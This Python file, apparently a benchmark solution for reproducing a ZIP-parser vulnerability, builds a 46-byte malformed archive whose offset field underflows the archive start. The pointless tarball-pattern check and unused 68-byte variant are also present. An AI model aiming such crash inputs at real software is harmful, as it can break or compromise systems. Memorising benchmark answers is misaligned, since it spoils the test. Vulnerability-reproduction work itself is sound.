import struct
import tarfile
from typing import Optional


class Solution:
    def _looks_like_zip_project(self, src_path: str) -> bool:
        patterns = (
            b"06054b50", b"0x06054b50",
            b"02014b50", b"0x02014b50",
            b"end of central directory", b"central directory",
            b"ZIP", b"zip",
            b"PK\\005\\006", b"PK\\001\\002",
        )
        try:
            with tarfile.open(src_path, "r:*") as tf:
                checked = 0
                for m in tf:
                    if checked >= 400:
                        break
                    if not m.isfile():
                        continue
                    if m.size <= 0:
                        continue
                    checked += 1
                    if m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    for p in patterns:
                        if p in data:
                            return True
        except Exception:
            return False
        return False

    def _make_zip_poc_46(self) -> bytes:
        # 24-byte truncated Central Directory File Header followed by EOCD (22 bytes)
        cd_trunc = (
            b"PK\x01\x02" +              # central directory signature
            b"\x00\x00" +                # version made by
            b"\x00\x00" +                # version needed to extract
            b"\x00\x00" +                # general purpose bit flag
            b"\x00\x00" +                # compression method
            b"\x00\x00" +                # file last mod time
            b"\x00\x00" +                # file last mod date
            b"\x00\x00\x00\x00" +        # crc-32
            b"\x00\x00\x00\x00"          # compressed size
        )
        assert len(cd_trunc) == 24

        eocd = struct.pack(
            "<4sHHHHIIH",
            b"PK\x05\x06",  # EOCD signature
            0,              # number of this disk
            0,              # number of the disk with the start of the central directory
            1,              # total number of entries in the central directory on this disk
            1,              # total number of entries in the central directory
            24,             # size of the central directory
            1,              # offset of start of central directory (relative) -> makes archive start negative
            0               # zip file comment length
        )
        assert len(eocd) == 22
        poc = cd_trunc + eocd
        assert len(poc) == 46
        return poc

    def _make_zip_poc_68(self) -> bytes:
        cd_full = struct.pack(
            "<4sHHHHHHIIIHHHHHII",
            b"PK\x01\x02",  # signature
            0,              # ver made
            0,              # ver needed
            0,              # flags
            0,              # compression
            0,              # mod time
            0,              # mod date
            0,              # crc32
            0,              # comp size
            0,              # uncomp size
            0,              # fname len
            0,              # extra len
            0,              # comment len
            0,              # disk start
            0,              # int attr
            0,              # ext attr
            0               # local header offset
        )
        eocd = struct.pack("<4sHHHHIIH", b"PK\x05\x06", 0, 0, 1, 1, 46, 1, 0)
        return cd_full + eocd

    def solve(self, src_path: str) -> bytes:
        # Primary PoC (46 bytes) consistent with the reported ground-truth length.
        poc46 = self._make_zip_poc_46()

        # If the project doesn't look like it handles ZIP at all, still return the same PoC;
        # the task is single-target and this is the best guess.
        if self._looks_like_zip_project(src_path):
            return poc46
        return poc46